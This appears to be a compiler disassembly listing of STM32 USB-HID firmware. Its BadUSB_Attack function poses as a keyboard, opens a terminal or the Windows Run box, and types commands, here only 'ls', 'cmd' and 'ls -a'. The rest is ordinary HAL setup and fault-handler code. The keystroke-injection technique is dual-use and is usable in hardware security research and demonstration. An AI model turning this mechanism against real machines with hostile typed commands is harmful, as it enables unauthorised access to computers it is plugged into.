 8000a60:	f043 0301 	orr.w	r3, r3, #1
 8000a64:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000a66:	f000 f9eb 	bl	8000e40 <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000a6a:	4803      	ldr	r0, [pc, #12]	; (8000a78 <InterruptTrap+0x38>)
 8000a6c:	f004 f934 	bl	8004cd8 <HAL_TIM_Base_Start_IT>
	}
}
 8000a70:	bf00      	nop
 8000a72:	3708      	adds	r7, #8
 8000a74:	46bd      	mov	sp, r7
 8000a76:	bd80      	pop	{r7, pc}
 8000a78:	200002e4 	.word	0x200002e4

08000a7c <BadUSB_Attack>:

void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 8000a7c:	b580      	push	{r7, lr}
 8000a7e:	b0c4      	sub	sp, #272	; 0x110
 8000a80:	af00      	add	r7, sp, #0
 8000a82:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000a86:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000a8a:	6018      	str	r0, [r3, #0]
	if(type == 0){
 8000a8c:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000a90:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000a94:	681b      	ldr	r3, [r3, #0]
 8000a96:	2b00      	cmp	r3, #0
 8000a98:	d125      	bne.n	8000ae6 <BadUSB_Attack+0x6a>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000a9a:	4a40      	ldr	r2, [pc, #256]	; (8000b9c <BadUSB_Attack+0x120>)
 8000a9c:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000aa0:	6812      	ldr	r2, [r2, #0]
 8000aa2:	4611      	mov	r1, r2
 8000aa4:	8019      	strh	r1, [r3, #0]
 8000aa6:	3302      	adds	r3, #2
 8000aa8:	0c12      	lsrs	r2, r2, #16
 8000aaa:	701a      	strb	r2, [r3, #0]
		char AttackStr[256];
		strcpy(AttackStr, "ls\n\nexit\n\n");
 8000aac:	f107 0308 	add.w	r3, r7, #8
 8000ab0:	4a3b      	ldr	r2, [pc, #236]	; (8000ba0 <BadUSB_Attack+0x124>)
 8000ab2:	ca07      	ldmia	r2, {r0, r1, r2}
 8000ab4:	c303      	stmia	r3!, {r0, r1}
 8000ab6:	801a      	strh	r2, [r3, #0]
 8000ab8:	3302      	adds	r3, #2
 8000aba:	0c12      	lsrs	r2, r2, #16
 8000abc:	701a      	strb	r2, [r3, #0]

		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000abe:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 8000ac2:	2103      	movs	r1, #3
 8000ac4:	4618      	mov	r0, r3
 8000ac6:	f7ff ff27 	bl	8000918 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000aca:	f107 0308 	add.w	r3, r7, #8
 8000ace:	4618      	mov	r0, r3
 8000ad0:	f7ff fb7c 	bl	80001cc <strlen>
 8000ad4:	4603      	mov	r3, r0
 8000ad6:	4619      	mov	r1, r3
 8000ad8:	f107 0308 	add.w	r3, r7, #8
 8000adc:	4a31      	ldr	r2, [pc, #196]	; (8000ba4 <BadUSB_Attack+0x128>)
 8000ade:	4618      	mov	r0, r3
 8000ae0:	f7ff ff46 	bl	8000970 <SimulateKeyStrokes>
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
}
 8000ae4:	e054      	b.n	8000b90 <BadUSB_Attack+0x114>
	}else if(type == 1){
 8000ae6:	f507 7388 	add.w	r3, r7, #272	; 0x110
 8000aea:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 8000aee:	681b      	ldr	r3, [r3, #0]
 8000af0:	2b01      	cmp	r3, #1
 8000af2:	d137      	bne.n	8000b64 <BadUSB_Attack+0xe8>
		uint8_t StartWindowsTerminal[2] = {132, 'R'};
 8000af4:	f245 2384 	movw	r3, #21124	; 0x5284
 8000af8:	f8a7 3108 	strh.w	r3, [r7, #264]	; 0x108
		strcpy(AttackStr, "cmd\n");
 8000afc:	f107 0308 	add.w	r3, r7, #8
 8000b00:	4a29      	ldr	r2, [pc, #164]	; (8000ba8 <BadUSB_Attack+0x12c>)
 8000b02:	e892 0003 	ldmia.w	r2, {r0, r1}
 8000b06:	6018      	str	r0, [r3, #0]
 8000b08:	3304      	adds	r3, #4
 8000b0a:	7019      	strb	r1, [r3, #0]
		SimulateShortcutKey(StartWindowsTerminal, 2);
 8000b0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b10:	2102      	movs	r1, #2
 8000b12:	4618      	mov	r0, r3
 8000b14:	f7ff ff00 	bl	8000918 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b18:	f107 0308 	add.w	r3, r7, #8
 8000b1c:	4618      	mov	r0, r3
 8000b1e:	f7ff fb55 	bl	80001cc <strlen>
 8000b22:	4603      	mov	r3, r0
 8000b24:	4619      	mov	r1, r3
 8000b26:	f107 0308 	add.w	r3, r7, #8
 8000b2a:	4a1e      	ldr	r2, [pc, #120]	; (8000ba4 <BadUSB_Attack+0x128>)
 8000b2c:	4618      	mov	r0, r3
 8000b2e:	f7ff ff1f 	bl	8000970 <SimulateKeyStrokes>
		HAL_Delay(5000);//can not use HAL_Delay func
 8000b32:	f241 3088 	movw	r0, #5000	; 0x1388
 8000b36:	f000 fb2d 	bl	8001194 <HAL_Delay>
		strcpy(AttackStr, "ls -a\n\n");
 8000b3a:	f107 0308 	add.w	r3, r7, #8
 8000b3e:	4a1b      	ldr	r2, [pc, #108]	; (8000bac <BadUSB_Attack+0x130>)
 8000b40:	e892 0003 	ldmia.w	r2, {r0, r1}
 8000b44:	e883 0003 	stmia.w	r3, {r0, r1}
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b48:	f107 0308 	add.w	r3, r7, #8
 8000b4c:	4618      	mov	r0, r3
 8000b4e:	f7ff fb3d 	bl	80001cc <strlen>
 8000b52:	4603      	mov	r3, r0
 8000b54:	4619      	mov	r1, r3
 8000b56:	f107 0308 	add.w	r3, r7, #8
 8000b5a:	4a12      	ldr	r2, [pc, #72]	; (8000ba4 <BadUSB_Attack+0x128>)
 8000b5c:	4618      	mov	r0, r3
 8000b5e:	f7ff ff07 	bl	8000970 <SimulateKeyStrokes>
}
 8000b62:	e015      	b.n	8000b90 <BadUSB_Attack+0x114>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000b64:	f107 0308 	add.w	r3, r7, #8
 8000b68:	4a11      	ldr	r2, [pc, #68]	; (8000bb0 <BadUSB_Attack+0x134>)
 8000b6a:	4618      	mov	r0, r3
 8000b6c:	4611      	mov	r1, r2
 8000b6e:	234e      	movs	r3, #78	; 0x4e
 8000b70:	461a      	mov	r2, r3
 8000b72:	f00c fa45 	bl	800d000 <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b76:	f107 0308 	add.w	r3, r7, #8
 8000b7a:	4618      	mov	r0, r3
 8000b7c:	f7ff fb26 	bl	80001cc <strlen>
 8000b80:	4603      	mov	r3, r0
 8000b82:	4619      	mov	r1, r3
 8000b84:	f107 0308 	add.w	r3, r7, #8
 8000b88:	4a06      	ldr	r2, [pc, #24]	; (8000ba4 <BadUSB_Attack+0x128>)
 8000b8a:	4618      	mov	r0, r3
 8000b8c:	f7ff fef0 	bl	8000970 <SimulateKeyStrokes>
}
 8000b90:	bf00      	nop
 8000b92:	f507 7788 	add.w	r7, r7, #272	; 0x110
 8000b96:	46bd      	mov	sp, r7
 8000b98:	bd80      	pop	{r7, pc}
 8000b9a:	bf00      	nop
 8000b9c:	0800d128 	.word	0x0800d128
 8000ba0:	0800d0bc 	.word	0x0800d0bc
 8000ba4:	20000278 	.word	0x20000278
 8000ba8:	0800d0c8 	.word	0x0800d0c8
 8000bac:	0800d0d0 	.word	0x0800d0d0
 8000bb0:	0800d0d8 	.word	0x0800d0d8

08000bb4 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000bb4:	b580      	push	{r7, lr}
 8000bb6:	b082      	sub	sp, #8
 8000bb8:	af00      	add	r7, sp, #0
 8000bba:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000bbc:	687b      	ldr	r3, [r7, #4]
 8000bbe:	4a1d      	ldr	r2, [pc, #116]	; (8000c34 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000bc0:	4293      	cmp	r3, r2
 8000bc2:	d133      	bne.n	8000c2c <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000bc4:	4b1c      	ldr	r3, [pc, #112]	; (8000c38 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bc6:	681b      	ldr	r3, [r3, #0]
 8000bc8:	2b00      	cmp	r3, #0
 8000bca:	d108      	bne.n	8000bde <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000bcc:	2080      	movs	r0, #128	; 0x80
 8000bce:	f7ff fdb7 	bl	8000740 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000bd2:	220f      	movs	r2, #15
 8000bd4:	4919      	ldr	r1, [pc, #100]	; (8000c3c <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000bd6:	481a      	ldr	r0, [pc, #104]	; (8000c40 <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000bd8:	f007 feec 	bl	80089b4 <USBD_CUSTOM_HID_SendReport>
 8000bdc:	e018      	b.n	8000c10 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000bde:	4b16      	ldr	r3, [pc, #88]	; (8000c38 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000be0:	681b      	ldr	r3, [r3, #0]
 8000be2:	2b01      	cmp	r3, #1
 8000be4:	d10c      	bne.n	8000c00 <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000be6:	f7ff fe6f 	bl	80008c8 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000bea:	4b16      	ldr	r3, [pc, #88]	; (8000c44 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000bec:	781b      	ldrb	r3, [r3, #0]
 8000bee:	f003 0302 	and.w	r3, r3, #2
 8000bf2:	2b00      	cmp	r3, #0
 8000bf4:	d10c      	bne.n	8000c10 <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000bf6:	4b10      	ldr	r3, [pc, #64]	; (8000c38 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bf8:	f04f 32ff 	mov.w	r2, #4294967295
 8000bfc:	601a      	str	r2, [r3, #0]
 8000bfe:	e007      	b.n	8000c10 <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c00:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c04:	681b      	ldr	r3, [r3, #0]
 8000c06:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c0a:	f023 0301 	bic.w	r3, r3, #1
 8000c0e:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c10:	4b09      	ldr	r3, [pc, #36]	; (8000c38 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c12:	681b      	ldr	r3, [r3, #0]
 8000c14:	1c59      	adds	r1, r3, #1
 8000c16:	4b0c      	ldr	r3, [pc, #48]	; (8000c48 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000c18:	fb83 3201 	smull	r3, r2, r3, r1
 8000c1c:	17cb      	asrs	r3, r1, #31
 8000c1e:	1ad2      	subs	r2, r2, r3
 8000c20:	4613      	mov	r3, r2
 8000c22:	005b      	lsls	r3, r3, #1
 8000c24:	4413      	add	r3, r2
 8000c26:	1aca      	subs	r2, r1, r3
 8000c28:	4b03      	ldr	r3, [pc, #12]	; (8000c38 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c2a:	601a      	str	r2, [r3, #0]
	}
}
 8000c2c:	bf00      	nop
 8000c2e:	3708      	adds	r7, #8
 8000c30:	46bd      	mov	sp, r7
 8000c32:	bd80      	pop	{r7, pc}
 8000c34:	200002e4 	.word	0x200002e4
 8000c38:	20000274 	.word	0x20000274
 8000c3c:	2000025c 	.word	0x2000025c
 8000c40:	200003c0 	.word	0x200003c0
 8000c44:	2000026c 	.word	0x2000026c
 8000c48:	55555556 	.word	0x55555556

08000c4c <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000c4c:	b480      	push	{r7}
 8000c4e:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000c50:	b672      	cpsid	i
}
 8000c52:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000c54:	e7fe      	b.n	8000c54 <Error_Handler+0x8>
	...

08000c58 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000c58:	b580      	push	{r7, lr}
 8000c5a:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000c5c:	4b1b      	ldr	r3, [pc, #108]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c5e:	4a1c      	ldr	r2, [pc, #112]	; (8000cd0 <MX_SPI1_Init+0x78>)
 8000c60:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000c62:	4b1a      	ldr	r3, [pc, #104]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c64:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000c68:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000c6a:	4b18      	ldr	r3, [pc, #96]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c6c:	2200      	movs	r2, #0
 8000c6e:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000c70:	4b16      	ldr	r3, [pc, #88]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c72:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000c76:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000c78:	4b14      	ldr	r3, [pc, #80]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c7a:	2200      	movs	r2, #0
 8000c7c:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000c7e:	4b13      	ldr	r3, [pc, #76]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c80:	2200      	movs	r2, #0
 8000c82:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000c84:	4b11      	ldr	r3, [pc, #68]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c86:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000c8a:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000c8c:	4b0f      	ldr	r3, [pc, #60]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c8e:	2228      	movs	r2, #40	; 0x28
 8000c90:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000c92:	4b0e      	ldr	r3, [pc, #56]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c94:	2200      	movs	r2, #0
 8000c96:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000c98:	4b0c      	ldr	r3, [pc, #48]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000c9a:	2200      	movs	r2, #0
 8000c9c:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000c9e:	4b0b      	ldr	r3, [pc, #44]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000ca0:	2200      	movs	r2, #0
 8000ca2:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000ca4:	4b09      	ldr	r3, [pc, #36]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000ca6:	2207      	movs	r2, #7
 8000ca8:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000caa:	4b08      	ldr	r3, [pc, #32]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000cac:	2200      	movs	r2, #0
 8000cae:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000cb0:	4b06      	ldr	r3, [pc, #24]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000cb2:	2208      	movs	r2, #8
 8000cb4:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000cb6:	4805      	ldr	r0, [pc, #20]	; (8000ccc <MX_SPI1_Init+0x74>)
 8000cb8:	f003 ff14 	bl	8004ae4 <HAL_SPI_Init>
 8000cbc:	4603      	mov	r3, r0
 8000cbe:	2b00      	cmp	r3, #0
 8000cc0:	d001      	beq.n	8000cc6 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000cc2:	f7ff ffc3 	bl	8000c4c <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000cc6:	bf00      	nop
 8000cc8:	bd80      	pop	{r7, pc}
 8000cca:	bf00      	nop
 8000ccc:	20000280 	.word	0x20000280
 8000cd0:	40013000 	.word	0x40013000

08000cd4 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000cd4:	b580      	push	{r7, lr}
 8000cd6:	b08a      	sub	sp, #40	; 0x28
 8000cd8:	af00      	add	r7, sp, #0
 8000cda:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000cdc:	f107 0314 	add.w	r3, r7, #20
 8000ce0:	2200      	movs	r2, #0
 8000ce2:	601a      	str	r2, [r3, #0]
 8000ce4:	605a      	str	r2, [r3, #4]
 8000ce6:	609a      	str	r2, [r3, #8]
 8000ce8:	60da      	str	r2, [r3, #12]
 8000cea:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000cec:	687b      	ldr	r3, [r7, #4]
 8000cee:	681b      	ldr	r3, [r3, #0]
 8000cf0:	4a17      	ldr	r2, [pc, #92]	; (8000d50 <HAL_SPI_MspInit+0x7c>)
 8000cf2:	4293      	cmp	r3, r2
 8000cf4:	d128      	bne.n	8000d48 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000cf6:	4b17      	ldr	r3, [pc, #92]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000cf8:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000cfa:	4a16      	ldr	r2, [pc, #88]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000cfc:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d00:	6613      	str	r3, [r2, #96]	; 0x60
 8000d02:	4b14      	ldr	r3, [pc, #80]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000d04:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d06:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d0a:	613b      	str	r3, [r7, #16]
 8000d0c:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d0e:	4b11      	ldr	r3, [pc, #68]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000d10:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d12:	4a10      	ldr	r2, [pc, #64]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000d14:	f043 0301 	orr.w	r3, r3, #1
 8000d18:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000d1a:	4b0e      	ldr	r3, [pc, #56]	; (8000d54 <HAL_SPI_MspInit+0x80>)
 8000d1c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d1e:	f003 0301 	and.w	r3, r3, #1
 8000d22:	60fb      	str	r3, [r7, #12]
 8000d24:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000d26:	23c2      	movs	r3, #194	; 0xc2
 8000d28:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000d2a:	2302      	movs	r3, #2
 8000d2c:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000d2e:	2300      	movs	r3, #0
 8000d30:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000d32:	2303      	movs	r3, #3
 8000d34:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000d36:	2305      	movs	r3, #5
 8000d38:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000d3a:	f107 0314 	add.w	r3, r7, #20
 8000d3e:	4619      	mov	r1, r3
 8000d40:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000d44:	f000 fdd4 	bl	80018f0 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000d48:	bf00      	nop
 8000d4a:	3728      	adds	r7, #40	; 0x28
 8000d4c:	46bd      	mov	sp, r7
 8000d4e:	bd80      	pop	{r7, pc}
 8000d50:	40013000 	.word	0x40013000
 8000d54:	40021000 	.word	0x40021000

08000d58 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000d58:	b480      	push	{r7}
 8000d5a:	b083      	sub	sp, #12
 8000d5c:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000d5e:	4b0f      	ldr	r3, [pc, #60]	; (8000d9c <HAL_MspInit+0x44>)
 8000d60:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d62:	4a0e      	ldr	r2, [pc, #56]	; (8000d9c <HAL_MspInit+0x44>)
 8000d64:	f043 0301 	orr.w	r3, r3, #1
 8000d68:	6613      	str	r3, [r2, #96]	; 0x60
 8000d6a:	4b0c      	ldr	r3, [pc, #48]	; (8000d9c <HAL_MspInit+0x44>)
 8000d6c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d6e:	f003 0301 	and.w	r3, r3, #1
 8000d72:	607b      	str	r3, [r7, #4]
 8000d74:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000d76:	4b09      	ldr	r3, [pc, #36]	; (8000d9c <HAL_MspInit+0x44>)
 8000d78:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000d7a:	4a08      	ldr	r2, [pc, #32]	; (8000d9c <HAL_MspInit+0x44>)
 8000d7c:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000d80:	6593      	str	r3, [r2, #88]	; 0x58
 8000d82:	4b06      	ldr	r3, [pc, #24]	; (8000d9c <HAL_MspInit+0x44>)
 8000d84:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000d86:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000d8a:	603b      	str	r3, [r7, #0]
 8000d8c:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000d8e:	bf00      	nop
 8000d90:	370c      	adds	r7, #12
 8000d92:	46bd      	mov	sp, r7
 8000d94:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000d98:	4770      	bx	lr
 8000d9a:	bf00      	nop
 8000d9c:	40021000 	.word	0x40021000

08000da0 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000da0:	b480      	push	{r7}
 8000da2:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000da4:	e7fe      	b.n	8000da4 <NMI_Handler+0x4>

08000da6 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000da6:	b480      	push	{r7}
 8000da8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000daa:	e7fe      	b.n	8000daa <HardFault_Handler+0x4>

08000dac <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000dac:	b480      	push	{r7}
 8000dae:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000db0:	e7fe      	b.n	8000db0 <MemManage_Handler+0x4>

08000db2 <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000db2:	b480      	push	{r7}
 8000db4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000db6:	e7fe      	b.n	8000db6 <BusFault_Handler+0x4>

08000db8 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000db8:	b480      	push	{r7}
 8000dba:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000dbc:	e7fe      	b.n	8000dbc <UsageFault_Handler+0x4>

08000dbe <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000dbe:	b480      	push	{r7}
 8000dc0:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000dc2:	bf00      	nop
 8000dc4:	46bd      	mov	sp, r7
 8000dc6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dca:	4770      	bx	lr

08000dcc <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000dcc:	b480      	push	{r7}
 8000dce:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000dd0:	bf00      	nop
 8000dd2:	46bd      	mov	sp, r7
 8000dd4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dd8:	4770      	bx	lr

08000dda <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000dda:	b480      	push	{r7}
 8000ddc:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000dde:	bf00      	nop
 8000de0:	46bd      	mov	sp, r7
 8000de2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000de6:	4770      	bx	lr

08000de8 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000de8:	b580      	push	{r7, lr}
 8000dea:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000dec:	f000 f9b2 	bl	8001154 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

